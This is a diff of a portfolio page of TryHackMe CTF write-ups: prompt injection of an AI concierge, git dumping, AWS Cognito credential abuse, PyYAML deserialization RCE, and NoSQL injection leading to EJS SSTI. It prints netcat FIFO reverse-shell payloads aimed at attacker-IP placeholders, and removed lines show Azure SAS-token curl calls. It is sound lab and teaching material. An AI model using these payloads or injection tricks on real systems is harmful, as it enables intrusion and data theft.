@@ -1,10 +1,10 @@
 ---
 layout: page
-title: project 4
+title: Hacker Holliday's Day 1-7
 description: another without an image
-img:
+img: THM.jpg
 importance: 3
-category: fun
+category: THM/CTF/Write Up's
 ---
 
 ##TryHackMe: Hacker Holidays — Complete Walkthrough & Write-ups 
@@ -17,14 +17,11 @@ Welcome to the comprehensive walkthrough and write-up repository for the **TryHa
 |---|---|---|---|---|
 | **Day 1** | The Concierge Knows Too Much | AI Prompt Injection / Role Impersonation | Web Browser | Easy |
 | **Day 2** | Room 404 | Exposed `.git` Directory & Git Forensics | `git-dumper`, `git` | Easy |
-| **Day 3** | Overheard at Breakfast | Email MD5 Hash Enumeration & Gravatar OSINT | `curl`, `jq`, Gravatar API | Easy |
+| **Day 3** | Complimentary | AWS Unauthenticated Cognito STS & DynamoDB Dumping | `AWS CLI`, Browser DevTools | Medium |
 | **Day 4** | Packed Light | Keylogger PCAP Reconstruction & XOR Decryption | `Wireshark`, `tshark`, `python` | Medium |
 | **Day 5** | Beach Bar | Unsafe PyYAML Deserialization to RCE & PrivEsc | `netcat`, `python` | Medium |
-| **Day 6** | Complimentary | AWS Unauthenticated Cognito STS & DynamoDB Dumping | `AWS CLI`, Browser DevTools | Medium |
+| **Day 6** | Overheard At Breakfast |Email MD5 Hash Enumeration & Gravatar OSINT | `curl`, `jq`, Gravatar API | Easy |
 | **Day 7** | Do Not Disturb | NoSQL Injection Authentication Bypass & Jinja2 SSTI | `Burp Suite`, Web Browser | Medium |
-| **Day 8** | The Brochure | PDF Generation Server-Side Request Forgery (SSRF) | `Burp Suite`, Web Browser | Medium |
-| **Day 9** | CryptoCabana | Azure Blob SAS Token & Key Vault Historical Secret Versioning | `Azure CLI`, Browser DevTools | Medium |
-
 ---
 
 # Day 1: The Concierge Knows Too Much
@@ -61,21 +58,6 @@ Explicate system context boundaries within the VERA guest-assistance AI interfac
 > **Room:** Room 404 (Hacker Holidays - Day 2)  
 > **Difficulty:** Easy  
 > **Category:** Web Security / Git Exposure  
-> **Target:** Web Application running on Port `8080`
-
----
-
-## Overview
-
-**Room 404** is part of TryHackMe's *Hacker Holidays* event series. The goal of this challenge is to identify and exploit a common web server security misconfiguration: an exposed publicly accessible `.git` repository. By extracting the source code using Git reconstruction tools, we recover the repository and extract the hidden flag.
-
----
-
-## 🛠️ Tools Used
-
-* **Gobuster** – Web directory enumeration
-* **cURL** – Direct HTTP request inspection
-* **git-dumper** – Automated dumping and reconstruction of exposed `.git` repositories
 
 ---
 
@@ -100,7 +82,7 @@ ref: refs/heads/main
 This confirms that the server's .git directory is exposed and points to the main branch.
 
 ###Step 2: Validating Git Reference Access
-Usingcurl, we request the reference object for the main branch to inspect the commit history pointer:
+Usingcurl, I request the reference object for the main branch to inspect the commit history pointer:
 
 ```bash
 curl http://<TARGET_IP>:8080/.git/refs/heads/main
@@ -111,7 +93,7 @@ Output:
 The request successfully returns the latest commit identifier hash, confirming that Git metadata objects are readable without authentication.
 
 ###Step 3: Dumping and Reconstructing the Repository
-Rather than manually fetching individual Git objects, we use git-dumper to automatically download and rebuild the entire repository structure.
+Rather than manually fetching individual Git objects, I used git-dumper to automatically download and rebuild the entire repository structure.
 
 ```bash
 git-dumper http://<TARGET_IP>:8080/.git repo
@@ -119,7 +101,7 @@ git-dumper http://<TARGET_IP>:8080/.git repo
 
 <img width="580" height="328" alt="vmware_1YSCqA9WTj" src="https://github.com/user-attachments/assets/4e391b00-d881-4be8-ba0d-bc54b3da41e7" />
 
-Once the repository download completes, navigate into the downloaded directory and list the contents:
+Once the repository download completes, I navigated into the downloaded directory and list the contents:
 
 ```bash
 cd repo
@@ -147,26 +129,6 @@ Clean Build Deployments: Do not deploy full git working copies directly to publi
 **Difficulty:** Easy  
 
 ---
-
-## Executive Summary
-
-The **Complimentary** room from TryHackMe’s *Hacker's Holiday* challenge highlights common misconfigurations in modern serverless web architectures—specifically within **AWS Cognito Identity Pools** and **AWS IAM Fine-Grained Access Control (FGAC)**. 
-
-While the front-end web application restricts guest users to viewing only their own wellness profiles, the underlying AWS IAM role assigned to unauthenticated guests lacks row-level constraints. By extracting Cognito parameters from client-side JavaScript, retrieving temporary AWS credentials via the AWS CLI, and bypassing the front-end entirely, an attacker can directly query DynamoDB to exfiltrate all stored guest records.
-
----
-
-## Key Concepts & Attack Path
-
-1. **Reconnaissance & Front-End Analysis:** Inspect `app.js` to extract AWS region, Cognito Identity Pool ID, and target DynamoDB table details.
-2. **Identity ID Generation:** Query AWS Cognito (`cognito-identity get-id`) as an unauthenticated guest to obtain a unique session identifier.
-3. **Credential Token Exchange:** Swap the `IdentityId` for temporary AWS STS keys (`AccessKeyId`, `SecretKey`, `SessionToken`) via `cognito-identity get-credentials-for-identity`.
-4. **Environment Setup & Verification:** Export the temporary credentials into local environment variables and verify the active identity using `aws sts get-caller-identity`.
-5. **Direct Data Exfiltration:** Execute an unauthenticated `aws dynamodb scan` against `complimentary-GuestWellnessProfiles` to retrieve all guest records and extract the target flag.
-
----
-
-## Detailed Step-by-Step Methodology
 
 ### Step 1: Front-End Code Inspection
 
@@ -241,18 +203,13 @@ Use API Gateway / Lambda Abstraction: Instead of direct AWS SDK access from the 
  
 **Category:** Network Forensics / Packet Analysis / Cryptography  
 **Difficulty:** Easy  
-
----
-
-## Executive Summary
-
-The **Packed Light** challenge focuses on inspecting network traffic to identify an active keylogger covertly exfiltrating keystrokes over HTTP. By analyzing a PCAP capture in Wireshark, extracting an exfiltrated Python script (`updates.py`), and reverse-engineering its obfuscation routines (Base64 + Single-byte XOR key indexing), we reconstruct the hidden exfiltration stream contained inside the `Cookie: hotel_sess_state` headers to reveal the hidden flag.
+**Tools** Wireshark
 
 ---
 
 ###Step 1: Network Traffic Analysis & Object Extraction
 
-Opening the provided `.pcapng` capture file in Wireshark, we begin by filtering for outgoing HTTP requests:
+Opening the provided `.pcapng` capture file in Wireshark, I began by filtering for outgoing HTTP requests:
 
 ```wireshark
 http.request
@@ -280,11 +237,11 @@ Tracing the internal data transformation logic in updates.py:
 
 $\text{Raw Character} \longrightarrow \text{XOR Encryption} \longrightarrow \text{Base64 Encoding} \longrightarrow \text{Cookie Header}$
 
-To decrypt the intercepted network traffic, we reverse the pipeline:
+To decrypt the intercepted network traffic, i reverse the pipeline:
 
 $\text{Cookie Payload} \longrightarrow \text{Base64 Decode} \longrightarrow \text{XOR Decrypt} \longrightarrow \text{Original Flag}$
 
-###Step 4: Used a python script to extract all the cooks on all HTTP request header each cookie that value of 'Cookie: hotel_sess_state='
+###Step 4: I sed a python script to extract all the cookies on all HTTP request header each cookie that value of 'Cookie: hotel_sess_state='
 
 <img width="724" height="712" alt="vmware_hpTWo8UHz5" src="https://github.com/user-attachments/assets/81af55ea-5736-494e-87c1-ca88c37b0cf5" />
 
@@ -307,7 +264,7 @@ Endpoint Detection & Response (EDR): Deploy behavior-based endpoint detection to
 
 ### Step 1 : Initial Access: Exposed Credentials
 
-Navigating to the target address presents the Beach Bar web application.
+I navigated to the target address presents the Beach Bar web application.
 
 Inspecting the HTML page source reveals a development comment left by the staff:
 
@@ -325,11 +282,11 @@ Inside the control panel, exporting the current playlist yields a playlist.yml f
 The panel includes a playlist import feature. When a file is uploaded, the response displays the parsed output in Python dictionary syntax. This indicates Python is handling the backend processing and potentially using an unsafe YAML loader (PyYAML).
 
 ### Step 3. Remote Code Execution (RCE)
-To test for unsafe YAML deserialization, construct a payload leveraging the Python constructor !!python/object/apply to execute subprocess.check_output:
+To test for unsafe YAML deserialization, I constructed a payload leveraging the Python constructor !!python/object/apply to execute subprocess.check_output:
 
 <img width="720" height="245" alt="vmware_4ZWDCiSxi8" src="https://github.com/user-attachments/assets/722a3a6d-3270-4e7a-b280-28605c882df8" />
 
-Uploading this payload causes the backend to execute id and render the output in the server response:
+Uploading this payload caused the backend to execute id and render the output in the server response:
 
 ```Python
 {'playlist': {'name': b'uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)\n', 'tracks': [{'artist': 'x', 'title': 'x'}]}}
@@ -338,13 +295,13 @@ Uploading this payload causes the backend to execute id and render the output in
 This confirms arbitrary command execution under the bartender context.
 
 ### Step 4. Obtaining a Reverse Shell
-Start a Netcat listener on your attack box:
+I Started a Netcat listener in kali:
 
 ```Bash
 nc -lnvp 1234
 ```
 
-Craft and import a YAML payload containing a FIFO reverse shell string:
+I crafted and imported a YAML payload containing a FIFO reverse shell string:
 
 ```Bash
 playlist:
@@ -352,7 +309,7 @@ playlist:
 ```
 (Replace ATTACKER_IP with your VPN IP address).
 
-Catch the incoming shell and upgrade it to a fully interactive TTY:
+I caught the incoming shell and upgraded it to a fully interactive TTY:
 
 ```Bash
 python3 -c "import pty; pty.spawn('/bin/bash')"
@@ -360,7 +317,7 @@ python3 -c "import pty; pty.spawn('/bin/bash')"
 <img width="541" height="115" alt="vmware_9wrXUKj8hl" src="https://github.com/user-attachments/assets/62e98ba0-8051-40f3-823c-37124d72ec6d" />
 
 ### Step 5. User Flag
-Navigate to the bartender user's home directory to retrieve user.txt:
+I navigated to the bartender user's home directory to retrieve user.txt:
 
 <img width="486" height="75" alt="vmware_X3NrKJlWM5" src="https://github.com/user-attachments/assets/1d33c336-e0c2-4503-b291-5c5bc6813c19" />
 
@@ -411,14 +368,9 @@ Fix: Store secrets in environment variables with strict permissions or secure co
 ---
 
 ## Day 6: Overheard at Breakfast 
-Room Link: TryHackMe - Overheard at Breakfast
+Room Link: Overheard at Breakfast
 Category: OSINT / Social Media / Email Hashing
 Difficulty: Easy
-
-📖 Overview & Scenario
-While staying at the Byte Lotus Hotel, a guest overhears a conversation on the breakfast terrace between two individuals: Ponzi (a self-described influencer) and Lambo (someone claiming to have gone off-grid on social media). The guest captures a screenshot of their chat.
-
-Our goal is to analyze the conversation screenshot, extract key metadata, track down a hidden profile, and retrieve the flag.
 
 ### Step 1: Investigate the screenshot
 When investigating the screen shot, we see that there is an email provided to get us started on our our first step of the investigation.
@@ -454,13 +406,6 @@ I threw the has in a small python script I wrote and I got the flag (I know thei
 Difficulty: Medium-High (3/5)
 Category: Web, Boot2root, NoSQL Injection, SSTI, Node.js, Debugger Escalation
 
-🎯 Task Objectives
-Gain initial access through NoSQL Authentication Bypass.
-Exploit Server-Side Template Injection (SSTI) in Node.js (EJS) to achieve RCE.
-Obtain the User Flag (user.txt).
-Inspect running services and locate the Node Inspector process.
-Escalate privileges via node inspect and filesystem debugging to obtain the Root Flag (root.txt).
-
 After Starting my lab machine I navigated to website and a presented with a log-in Screen.
 
 <img width="672" height="577" alt="vmware_tLPZ9Tq3xS" src="https://github.com/user-attachments/assets/ccf11aee-f961-4840-9279-057a4a6e5c75" />
@@ -480,16 +425,17 @@ Modified Request:
 <img width="1535" height="597" alt="vmware_xtQvA6ZA0f" src="https://github.com/user-attachments/assets/2c75cd00-d9f9-4f4b-9abf-c65ac2d93186" />
 
 Send the modified request. The server returns a 200 OK status and assigns a Staff Cookie.
-Import the session cookie into your browser (or use Open Response in Browser in Burp Suite) and navigate to http://<TARGET_IP>/staff. You should now have access to the staff dashboard.
+Import the session cookie into your browser (or use Open Response in Browser in Burp Suite) and navigate to http://<TARGET_IP>/staff. I should now have access to the staff dashboard.
 
 <img width="583" height="513" alt="vmware_rvj2inz6H3" src="https://github.com/user-attachments/assets/d2d8d3bc-478d-4521-aa5e-47efc263a9bd" />
 
 Phase 3: Exploitation — Server-Side Template Injection (SSTI) to RCE
-Once I learned On the /staff dashboard, there is an input form using the EJS template engine. Since input is processed directly by the renderer, this component is vulnerable to SSTI.
-I decided to try and set up a reverse shell listener on your attack machine using Penelope or Netcat: (I used penelope on this one)
+Once I learned On the /staff dashboard, there is an input form using EJS template engine. Since input is processed directly by the renderer, I found out this component is vulnerable to SSTI.
+
+I decided to try and set up a reverse shell listener in Kali using Penelope or Netcat: (I used penelope on this one)
 
 2. Execute RCE via EJS SSTI Payload
-Inject a Node.js child process payload into the template input parameter to spawn a reverse shell back to your VPN IP (<YOUR_IP>):
+I injected a Node.js child process payload into the template input parameter to spawn a reverse shell back to my IP.
 
 ```Bash
 <%= global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 4444 >/tmp/f') %>
@@ -522,226 +468,7 @@ Finally, I executed debugfs again with -R 'cat /root/root.txt' against /dev/nvme
 <img width="1146" height="435" alt="vmware_n8RTRWWWcS" src="https://github.com/user-attachments/assets/b0607df6-fed1-4399-a8c2-13e6d7e49f3d" />
 
 
-
 ---
-
-## Day 8: # Towel on the Sunbed
-
-* **Category:** Web Application Security
-* **Vulnerability Type:** Race Condition (Limit Overrun / Concurrency Control Flaw)
-* **Tools Used:** 
-  * Web Browser
-  * Burp Suite Professional / Community (Repeater Parallel Grouping)
-
----
-
-## 🔍 Walkthrough & Exploitation
-
-### Step 1: Account Registration & Initial Observation
-
-1. Navigate to the web application target IP in your browser.
-2. Click **Register** to create a new user account.
-3. Log in with the newly created credentials to access the user dashboard.
-
----
-
-### Step 2: Analyzing Application Logic
-
-1. Upon logging in, locate the **Claim Reward** function.
-2. Click **Claim Reward** once. You will successfully receive your initial allocation of "ponzi" points.
-3. Attempting to click **Claim Reward** a second time triggers a 24-hour timer restriction.
-4. Check the **Vault** requirements — unlocking it requires **150 ponzi**.
-
-<img width="731" height="347" alt="vmware_jULDv07l5V" src="https://github.com/user-attachments/assets/54b559ff-74dd-4eb4-aaf1-34c2f7d8e4e8" />
-
----
-
-### Step 3: Vulnerability Analysis
-
-1. Intercept the `POST /claim` (or relevant reward claim endpoint) request in **Burp Suite** and send it to **Repeater**.
-2. Resending the request individually yields an error indicating that the timer is actively blocking the request.
-3. **Flaw:** The server validates the cooldown state, updates the points, and updates the timestamp without enforcing mutex/locking locks or atomic database operations. This opens a window for a **Single-Packet / Parallel Race Condition Attack**.
-
-<img width="365" height="98" alt="vmware_Xuvkactdtf" src="https://github.com/user-attachments/assets/c6c1a96c-ee0c-4eb1-b4b5-77c59839cab0" />
-
----
-
-### Step 4: Exploiting the Race Condition
-
-To ensure clean state execution:
-
-1. Register a fresh account (or clear state) and obtain a brand-new session cookie (`connect.sid`).
-2. Intercept a fresh reward request in Burp Suite and capture the `connect.sid` value.
-3. In **Burp Repeater**:
-   * Create a **New Request Group**.
-   * Add the captured reward claim request into the group.
-   * Duplicate the request tab **~99 times** inside the same group.
-   * Update all duplicated tabs with the fresh `connect.sid` session token.
-4. Set the execution mode on the group tab dropdown to:
-   * **`Send group in parallel (last-byte sync)`**
-5. Click **Send Group**.
-
-<img width="779" height="537" alt="vmware_4yI2G3fCBj" src="https://github.com/user-attachments/assets/1b3a1231-f4ee-402c-a8aa-718f97ee4d5e" />
-
----
-
-### Step 5: Post-Exploitation & Flag Retrieval
-
-1. Observe the response codes across all tabs in the group — the parallel execution forces all requests through the validation window prior to the cooldown timestamp update.
-2. Return to the browser and refresh the application dashboard.
-3. The total accumulated balance will exceed **150 ponzi**.
-4. Navigate to the **Vault**, click **Open Vault**, and retrieve the flag!
-
-<img width="409" height="136" alt="vmware_Z8isODACLG" src="https://github.com/user-attachments/assets/4f1d944d-bbe1-424b-ae85-e2ddb9808a5d" />
-
-<img width="726" height="246" alt="vmware_Vis5CE7E4g" src="https://github.com/user-attachments/assets/02842d47-0ee2-472b-8b8d-e77943e988a6" />
-
-### Remediation & Mitigations
-To patch this race condition:
-Atomic Operations & Mutexes: Enforce strict session/user locking or handle balance/cooldown operations inside an atomic database transaction.
-Database Level Constraints: Implement unique transaction constraints or row-level locking (SELECT ... FOR UPDATE) before checking or modifying the timestamp/balance.
-Rate Limiting & Queueing: Queue incoming reward claims per user ID sequentially rather than handling them asynchronously across multiple concurrent worker threads.
----
-
-## Day 9: CryptoCabana
-* **Category:** Cloud Security / Azure Storage & Key Vault
-* **Target System:** Crypto Kiosk Azure Cloud Infrastructure
-
-### Step-by-Step Execution
-### Step 1: Initial Reconnaissance & Client-Side Source Inspection
-
-1. Navigate to the target web application hosted on Azure Blob Static Storage:
-   [https://cryptocabanaf5scjagc.z13.web.core.windows.net/](https://cryptocabanaf5scjagc.z13.web.core.windows.net/)
-
-After inspecting the source code I see, app.js and Inspected that further.
-Key Finding: The client-side code contains hardcoded credentials or a Shared Access Signature (SAS) token / connection string allowing direct API calls to Azure Storage blobs.
-
-<img width="1211" height="64" alt="vmware_TClvlz5aUs" src="https://github.com/user-attachments/assets/94fed7b3-ae77-4b6a-bf6d-63169486825c" />
-
-   
-2. **Azure Storage Enumeration & Artifact Download:**
-   With SAS key that has sp=rl rights im all to list all containers.
-   
-   
-   * Download configuration backups containing Azure Service Principal credentials (`App ID`, `Password`, `Tenant ID`).
-
-4. **Service Principal Authentication:**
-   * Log into Azure CLI using Service Principal details:
-   * 
-  curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
-
-and see $web, backup, and vault. Which is where i started to investigate next
-
-<img width="924" height="698" alt="vmware_8IEUySkT6P" src="https://github.com/user-attachments/assets/99a80f9e-d289-4545-886a-0d28c0b745d8" />
-
-and see $web, backup, and vault. Which is where i started to investigate next
-
-curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&comp=list&sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
-
-<img width="617" height="512" alt="vmware_omBGSmKyWu" src="https://github.com/user-attachments/assets/860ad6e8-a171-4f25-bcb6-13c33ad3b48e" />
-
-And I revelead two files backup-service-account.json and seed_phrase.txt (decoy).
-Continuing with investigation.
-
-curl -s "https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-account.json?sv=2022-11-02&ss=b&srt=sco&sp=rl&se=2099-12-31T23:59:59Z&st=2024-01-01T00:00:00Z&spr=https&sig=ZAo05W8KXdSLM9afYCNGogNRV2N5a6aB4dQI3LXz%2Fh0%3D"
-
-<img width="722" height="146" alt="vmware_cSXafPfrQF" src="https://github.com/user-attachments/assets/a5972a58-9a1c-4212-be8b-86f7238854a1" />
-
-I find service principle keys and the exact place I need to look.
-
-### Service Principle Authenication
-
-I then authenicate as service principle and try grab the master keys. 
-
-<img width="508" height="347" alt="vmware_oOW5G4Fm2y" src="https://github.com/user-attachments/assets/b92ace0c-95b1-465b-b6e3-ee00cb87f978" />
-
-It gave me forbidden so i decided to see what I could read instead.
-
-az keyvault secret list --vault-name ccabana-kv-f5scjagc --output table
-
-and I reveal three key shards and an expired master key so I try to see if I can read those.
-
-<img width="1074" height="349" alt="vmware_REORBczBeY" src="https://github.com/user-attachments/assets/d16ed8bd-7583-46b7-9214-f07f60ef82ba" />
-
-I was able to read key shar 1 and 3 but 2 was rotated after IT flagged it. 
-
-After some research I learned Azure Key Vault never overwrites secrets. Every update automatically generates a new version while preserving prior iterations. Anyone with get permissions for that secret can still access older, unpurged versions, meaning rotating a secret does not wipe its history. So decided to try and list it.
-
-az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2 -o json
-
-and I found two but one is created 2 min later the the older one. (the one I want).
-
-az keyvault secret show \
-  --id "https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0" \
-  --query value -o tsv
-
-<img width="903" height="542" alt="vmware_TGo8X3v2Wy" src="https://github.com/user-attachments/assets/5f0e30bf-befa-4558-9051-9edd4bb3a8dc" />
-
-I was able to read it and reveal the last part of the flag.
-
-
----
-
-## Day 10 The Hollow Shell
-
-
-
-
-
-
-
-
-
-
----
-
-## Day 11 Inifinity Pool
-
-
-
-
-
-
-
-
-
----
-
-Day 12 After Hours
-
-
-### Step 1: File Inspection & Initial Strings Analysis
-
-1. Download and extract the challenge task files (`attachments-*.zip`).
-2. Inspect the extracted files: `INDEX.BTR`, `MAPPING1.MAP`, `MAPPING2.MAP`, `MAPPING3.MAP`, `OBJECTS.DATA`. These are structural components of a Windows **WMI Repository**.
-4. Search across all raw data files for standard PowerShell execution signatures:
-
-    ```bash strings * | grep -i "powershell" ```
-   
-
-
-
-
----
-
-## Day 13 The Guestbook
-
-
-
-
-
-
-
-
-
-
-
-
-
-
----
-
-## Day 14: Management Wants A Word
 
 ## Defensive Remediation & Best Practices Summary
 
@@ -749,20 +476,23 @@ Day 12 After Hours
 |---|---|---|
 | **Prompt Injection** | Day 1 | Enforce strict System Prompts, enforce strict user privilege boundaries independent of LLM context, and deploy guardrail validation filters. |
 | **Exposed `.git` Folder** | Day 2 | Restrict web server access to dotfiles/directories (`.git`, `.env`) via web server rules (e.g., Nginx `location ~ /\.git`). |
-| **OSINT / MD5 Information Leak** | Day 3 | Avoid using plain MD5 email hashes for user profile identification; use random UUIDs or salted hashes. |
+| **Over-permissioned AWS Cognito** | Day 6 | Enforce Least Privilege IAM policies on Cognito Unauthenticated roles; restrict DynamoDB `Scan` permissions. |
 | **Unencrypted C2 / Keylogging** | Day 4 | Deploy Endpoint Detection & Response (EDR) agents to detect unauthorized keystroke hooks (`pynput`), and inspect egress traffic for anomaly patterns. |
 | **Unsafe PyYAML Deserialization** | Day 5 | Always use `yaml.safe_load()` instead of `yaml.load()` in Python applications. |
-| **Over-permissioned AWS Cognito** | Day 6 | Enforce Least Privilege IAM policies on Cognito Unauthenticated roles; restrict DynamoDB `Scan` permissions. |
+| **OSINT / MD5 Information Leak** | Day 3 | Avoid using plain MD5 email hashes for user profile identification; use random UUIDs or salted hashes. |
 | **NoSQL Injection & SSTI** | Day 7 | Sanitize inputs using strict typing/schema validation (e.g., Zod/Joi), and render templates securely using auto-escaping without direct system execution functions. |
-| **PDF Converter SSRF** | Day 8 | Restrict PDF engines from fetching local resources (`127.0.0.1`, `file://`), run converters in isolated sandbox containers, and enforce strict URL whitelisting. |
-| **Exposed SAS Tokens & Key Vault Secrets** | Day 9 | Implement Azure Key Vault automated purge/expiration rules upon rotation, and never embed full-access SAS tokens in frontend code (use backend delegation instead). |
 
+## Conclusion & Key Takeaways
+
+Completing the **TryHackMe Hacker Holidays** series reinforces that security is rarely about isolated flaws—it's about how interconnected components fail together. 
+
+Across these challenges, the hands-on practice highlights several critical defense principles:
+
+* **Defense in Depth:** Client-side controls and hidden assets (like JS bundle tokens or exposed `.git` directories) will always be uncovered; application security must rely on backend authorization controls.
+* **Identity as the Boundary:** Whether handling AI agent contexts, AWS STS temporary keys, or Azure Key Vault secrets, securing identity and access policies is the most vital cloud control.
+* **Input Validation Still Matters:** Classic injection vectors (PyYAML deserialization, NoSQL operator injection, and SSTI) remain high-risk when untrusted user input directly feeds application functions.
+
+These hands-on labs serve as a great reminder that practical execution is the best way to bridge theoretical knowledge and real-world security engineering. 
+
+*More write-ups and security lab documentation will be published as days 8-14 wirute-ups are completed.*
 ---
-
-*Authored for security documentation and portfolio reference.*
-"""
-
-with open("README.md", "w") as f:
-    f.write(readme_content)
-
-print("README.md file successfully generated.")
